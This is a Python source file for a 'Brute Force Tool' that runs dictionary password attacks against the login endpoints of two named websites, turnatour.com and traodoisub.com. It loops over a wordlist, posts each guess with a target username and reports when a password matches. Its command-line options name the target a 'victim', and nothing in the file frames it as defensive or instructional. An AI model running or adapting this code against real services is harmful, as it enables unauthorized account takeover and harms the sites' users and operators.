"""
..............................
. @Name:    Brute Force Tool .
. @Author:  f1nl0wt3ch       .
. @Date:    28.12.2020       .
..............................

"""

import requests
import argparse
import itertools
import time
import sys

HEADERS = {
    "Content-Type": "application/json;charset=utf-8",
    "Accept": "application/json"
}


def _animate(done):
    for c in itertools.cycle(['...|', '.../', '...-', '...\\']):
        if done:
            break
        sys.stdout.write('\rBrute forcing ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!     ')


# turnatour.com
def _scan_password_turnatour(path_file, user, target_url):
    line_count = 1
    with open(path_file) as f:
        # _animate(False)
        for password in f:
            r = requests.post(target_url, data={"fName": "UserLogin",
                                                "fileName": "UserLogin",
                                                "islem": "login",
                                                "ccode": "",
                                                "cuser": user,
                                                "cpass": password
                                                }, headers=HEADERS)

            # print(str(r.json()))
            if r.json()['IsError']:
                sys.stdout.write("Not matched | " + str(line_count) + ". " + password)
                line_count += 1
            elif r.json() == 1:
                print("Password found: " + password)
                break
            else:
                sys.stdout.write(str(r.json()))
        print(str(line_count) + " passwords are scanned!")

    # traodoisub.com


def _scan_password_traodoisub(path_file, user, target_url):
    line_count = 1
    with open(path_file) as f:
        # _animate(False)
        for password in f:
            r = requests.post(target_url, data={
                "username": user,
                "password": password,
                "submit": "submit"
            }, headers=HEADERS)
            if hasattr(r, 'success') and r.success:
                print("Password found: " + password)
                break
            elif r.json() == 1:
                sys.stdout.write("Not matched | " + str(line_count) + ". " + password)
                line_count += 1
            else:
                sys.stdout.write(str(r.json()))
        print(str(line_count) + " passwords are scanned!")


# get selected function
def _brute_force(victim, path_file, user, target_url):
    switcher = {
        0: _scan_password_turnatour,
        1: _scan_password_traodoisub,
        2: lambda: 'two'
    }
    func = switcher.get(victim, lambda: 'Invalid')
    return func(path_file, user, target_url)


def _initialize_args():
    parser = argparse.ArgumentParser('f1nl0wt3ch Bruteforce Tool')
    parser.add_argument("-P", "--path", type=str, help=" ==> Path Of Password Dictionary")
    parser.add_argument("-U", "--username", type=str, help=" ==> Target Username")
    parser.add_argument("-H", "--host", type=str, help=" ==> Target Host")
    parser.add_argument("-V", "--victim", type=int, help=" ==> Select Number, which Present For Victim")

    args = parser.parse_args()
    return args


def start():
    try:
        # Initialize arguments
        args = _initialize_args()
        path_file = args.path
        user = args.username
        target_url = args.host
        victim = args.victim

        # Start bruteforcing
        _brute_force(victim, path_file, user, target_url)
        return True
    except Exception as e:
        print(str(e))
        exit(0)


if __name__ == '__main__':
    start()
